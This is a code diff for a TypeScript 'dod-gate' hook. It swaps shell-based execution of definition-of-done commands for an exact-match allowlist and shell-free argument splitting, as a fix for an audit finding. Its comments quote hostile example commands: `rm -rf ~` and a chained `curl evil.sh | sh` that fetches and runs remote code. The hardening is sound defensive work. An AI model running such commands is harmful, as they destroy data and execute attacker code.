@@ -64,13 +64,89 @@ export interface CommandResult {
 }
 
 /**
- * Run one DoD command from `cwd`.
- * `[assumption]` — commands run through `sh -c`, because a team's DoD is written
- * the way they type it (`npm run test`), and the spec constrains only the commands
- * a *stage file* may cite, not a story's dod block.
+ * Whether a command may be run at all: byte-equal to one the workspace declared.
+ *
+ * The 2026-08-29 audit's second measured finding. `dod-gate` ships as a default
+ * PreToolUse hook with a 960 s timeout, `runDodCommand` handed the model's string
+ * to `/bin/sh -c`, and nothing between the two consulted an allowlist — a story
+ * with `dod: rm -rf ~` ran it at the moment someone marked the story done.
+ *
+ * Byte-equality is the whole rule, deliberately: no normalisation, no prefix
+ * match, no "it starts with npm so it is probably fine". `npm run test` is a
+ * command; `npm run test; curl evil.sh | sh` is a different string and is not in
+ * the set.
  */
-export async function runDodCommand(command: string, cwd: string, timeoutMs: number): Promise<CommandResult> {
-  const { exitCode, stdout, stderr, timedOut } = await runtime.spawn("/bin/sh", ["-c", command], {
+export function isAllowedDodCommand(command: string, allowed: ReadonlySet<string>): boolean {
+  return allowed.has(command);
+}
+
+/** Shell metacharacters: they only mean anything to a shell, and none is opened. */
+const META_RE = /[|&;<>$`(){}*?~\\]/;
+
+/**
+ * Split a command into argv without a shell.
+ *
+ * Handles the shape a `commands:` entry actually has — words, and quoted words.
+ * A BARE token carrying a shell metacharacter (`| & ; < > $ \` ( ) { } * ? ~ \`)
+ * makes the whole command unsplittable and it is refused: those mean something
+ * only a shell can give them.
+ *
+ * A QUOTED token may contain anything — it is passed to the child as one literal
+ * argument, which is exactly what a shell would have done with it and what makes
+ * `sh -c "…"` expressible. That is not a hole: a team that wants a shell says so
+ * in `workspace.yml`, and the allowlist is the control, not the syntax.
+ */
+export function splitArgv(command: string): readonly string[] | null {
+  if (/[\n\r]/.test(command)) return null;
+  const argv: string[] = [];
+  const pattern = /"([^"]*)"|'([^']*)'|([^\s"']+)/g;
+  for (const match of command.matchAll(pattern)) {
+    if (match[1] !== undefined || match[2] !== undefined) {
+      argv.push(match[1] ?? match[2] ?? "");
+      continue;
+    }
+    const bare = match[3] ?? "";
+    if (META_RE.test(bare)) return null;
+    argv.push(bare);
+  }
+  return argv.length === 0 ? null : argv;
+}
+
+export class DodCommandRefused extends Error {}
+
+/**
+ * Run one DoD command from `cwd` — only if the workspace declared it.
+ *
+ * Two changes from the version the audit measured: the allowlist is consulted
+ * BEFORE anything is spawned, and the spawn is argv-based rather than `sh -c`
+ * wherever the command can be split. A command that genuinely needs a shell (a
+ * pipeline, a redirect) is refused rather than silently shelled: the team can
+ * wrap it in a script and declare THAT.
+ */
+export async function runDodCommand(
+  command: string,
+  cwd: string,
+  timeoutMs: number,
+  allowed: ReadonlySet<string>,
+): Promise<CommandResult> {
+  if (!isAllowedDodCommand(command, allowed)) {
+    throw new DodCommandRefused(
+      allowed.size === 0
+        ? `\`${command}\` cannot be run: .tldrx/workspace.yml declares no commands, so there is nothing `
+          + "to check it against. An empty allowlist is not a permit."
+        : `\`${command}\` is not one of .tldrx/workspace.yml's commands. Declared: `
+          + `${[...allowed].map((c) => `\`${c}\``).join(", ")}.`,
+    );
+  }
+  const argv = splitArgv(command);
+  if (argv === null) {
+    throw new DodCommandRefused(
+      `\`${command}\` needs a shell to run (it contains a metacharacter), and this gate does not open one. `
+        + "Put it in a script, declare the script under the repo's `commands:`, and cite that.",
+    );
+  }
+  const head = argv[0] ?? "";
+  const { exitCode, stdout, stderr, timedOut } = await runtime.spawn(head, argv.slice(1), {
     cwd,
     timeoutMs,
   });
